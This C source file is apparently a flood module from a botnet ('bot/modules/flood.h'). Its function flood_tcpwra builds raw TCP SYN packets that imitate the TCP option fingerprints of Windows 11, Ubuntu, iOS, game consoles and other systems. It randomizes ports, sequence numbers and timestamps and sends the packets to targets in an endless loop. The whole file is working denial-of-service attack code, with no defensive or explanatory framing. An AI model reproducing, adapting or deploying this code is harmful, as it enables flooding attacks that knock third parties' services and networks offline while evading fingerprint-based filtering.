#include <netinet/in.h>
#include <stdlib.h>

#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#include "bot/definitions.h"
#include "bot/modules/flood.h"
#include "bot/utils/network.h"
#include "bot/utils/xoshiro.h"

static uint8_t windows11_syn_data[] = {0x02, 0x04, 0x05, 0xb4, 0x01, 0x03, 0x03, 0x08,
                                       0x01, 0x01, 0x04, 0x02, 0x08, 0x0a, 0x00, 0x00,
                                       0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

static uint8_t ubuntu22_syn_data[] = {0x02, 0x04, 0x05, 0xb4, 0x01, 0x01, 0x04, 0x02,
                                      0x01, 0x03, 0x03, 0x08, 0x08, 0x0a, 0x00, 0x00,
                                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

static uint8_t android13_syn_data[] = {0x02, 0x04, 0x05, 0xb4, 0x04, 0x02, 0x08, 0x0a, 0x00, 0x00,
                                       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x01, 0x04, 0x02};

static uint8_t ios17_syn_data[] = {0x02, 0x04, 0x05, 0xb4, 0x04, 0x02, 0x08, 0x0a, 0x00, 0x00,
                                   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x03, 0x03, 0x07};

static uint8_t macos14_syn_data[] = {0x02, 0x04, 0x05, 0xb4, 0x01, 0x03, 0x03, 0x06,
                                     0x01, 0x01, 0x04, 0x02, 0x08, 0x0a, 0x00, 0x00,
                                     0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

static uint8_t ps5_syn_data[] = {0x02, 0x04, 0x05, 0xb4, 0x01, 0x03, 0x03, 0x05, 0x01, 0x01, 0x04,
                                 0x02, 0x08, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

static uint8_t xbox_series_syn_data[] = {0x02, 0x04, 0x05, 0xb4, 0x01, 0x03, 0x03, 0x07,
                                         0x01, 0x01, 0x04, 0x02, 0x08, 0x0a, 0x00, 0x00,
                                         0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

static uint8_t nintendo_switch_syn_data[] = {0x02, 0x04, 0x05, 0xb4, 0x04, 0x02, 0x08,
                                             0x0a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                             0x00, 0x00, 0x01, 0x01, 0x04, 0x02};

static struct syn_template {
  uint8_t *data;
  uint16_t len;
  uint16_t ttl;
  uint16_t mss;
  uint16_t window;
} templates[] = {
    {windows11_syn_data, sizeof(windows11_syn_data), 128, 1460, 64240},
    {ubuntu22_syn_data, sizeof(ubuntu22_syn_data), 64, 1460, 29200},
    {android13_syn_data, sizeof(android13_syn_data), 64, 1440, 57344},
    {ios17_syn_data, sizeof(ios17_syn_data), 64, 1400, 65535},
    {macos14_syn_data, sizeof(macos14_syn_data), 64, 1460, 65535},
    {ps5_syn_data, sizeof(ps5_syn_data), 64, 1460, 64240},
    {xbox_series_syn_data, sizeof(xbox_series_syn_data), 128, 1460, 64240},
    {nintendo_switch_syn_data, sizeof(nintendo_switch_syn_data), 64, 1400, 65535},
};

void flood_tcpwra(pflood_context_t ctx) {
  u16 dport = flood_retrieve_u16(ctx, OPT_DPORT, 0);
  u16 sport = flood_retrieve_u16(ctx, OPT_SPORT, 0);
  u32 psleep = flood_retrieve_u32(ctx, OPT_SLEEP, 0);

  char **packets = calloc(ctx->num_targs, sizeof(char *));
  if (!packets) {
    LOG_ERROR("allocating targets failed");
    exit(0);
  }

  int fd = -1;
  if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {
    LOG_ERROR("opening a raw socket failed");
    exit(0);
  }

  if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &(int[]){1}, sizeof(int)) == -1) {
    LOG_INFO("setting HDRINCL failed");
    close(fd);
    exit(0);
  }

  for (int i = 0; i < ctx->num_targs; i++) {
    ptarget_t target = &ctx->targets[i];

    packets[i] = calloc(1510, sizeof(char));
    memset(packets[i], '\0', 1510);

    struct iphdr *iph = (struct iphdr *)packets[i];
    struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

    iph->version = 4;
    iph->ihl = 5;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + 0);
    iph->id = htons(xoshiro_next() & 0xFFFF);
    iph->ttl = 64;
    iph->frag_off = htons(1 << 14);
    iph->protocol = IPPROTO_TCP;
    iph->saddr = network_local_addr();
    iph->daddr = target->address;

    tcph->source = htons(sport == 0 ? (xoshiro_next() & 0xFFFF) : sport);
    tcph->dest = htons((dport == 0) ? (xoshiro_next() & 0xFFFF) : dport);
    tcph->seq = htons(xoshiro_next() & 0xFFFF);
    tcph->doff = (sizeof(struct tcphdr) + 0) / 4;
    tcph->urg = 0;
    tcph->ack = 0;
    tcph->psh = 0;
    tcph->rst = 0;
    tcph->syn = 1;
    tcph->fin = 0;
    tcph->window = htons(64240);
  }

  while (true) {
    for (int i = 0; i < ctx->num_targs; i++) {
      ptarget_t target = &ctx->targets[i];
      target_random_addr(target);

      char *pkt = packets[i];
      struct iphdr *iph = (struct iphdr *)pkt;
      struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

      struct syn_template *tmpl = &templates[rand() % (sizeof(templates) / sizeof(templates[0]))];
      iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + tmpl->len);
      iph->ttl = tmpl->ttl;

      tcph->doff = (sizeof(struct tcphdr) + tmpl->len) / 4;
      tcph->window = htons(tmpl->window);

      memcpy((uint8_t *)(tcph + 1), tmpl->data, tmpl->len);

      // goddamit forky
      for (uint16_t opt_offset = 0; opt_offset < tmpl->len;) {
        if (tmpl->data[opt_offset] == 0x08 && tmpl->data[opt_offset + 1] == 0x0a) {
          uint32_t tsval = xoshiro_next();
          uint32_t tsecr = xoshiro_next();
          memcpy((uint8_t *)(tcph + 1) + opt_offset + 2, &tsval, sizeof(tsval));
          memcpy((uint8_t *)(tcph + 1) + opt_offset + 6, &tsecr, sizeof(tsecr));
          break;
        }
        opt_offset += tmpl->data[opt_offset + 1];
      }

      iph->id = xoshiro_next() & 0xFFFF;
      tcph->source = htons(sport == 0 ? (xoshiro_next() & 0xFFFF) : sport);
      tcph->dest = htons(dport == 0 ? (xoshiro_next() & 0xFFFF) : dport);

      tcph->seq = xoshiro_next();
      tcph->ack_seq = xoshiro_next();

      iph->check = 0;
      iph->check = csum_compute(iph, sizeof(struct iphdr));

      tcph->check = 0;
      tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + tmpl->len),
                                    sizeof(struct tcphdr) + tmpl->len);

      target->saddr.sin_port = tcph->dest;
      sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + tmpl->len, MSG_NOSIGNAL,
             (struct sockaddr *)&target->saddr, sizeof(struct sockaddr_in));
    }

    if (psleep > 0) usleep(psleep);
  }
}
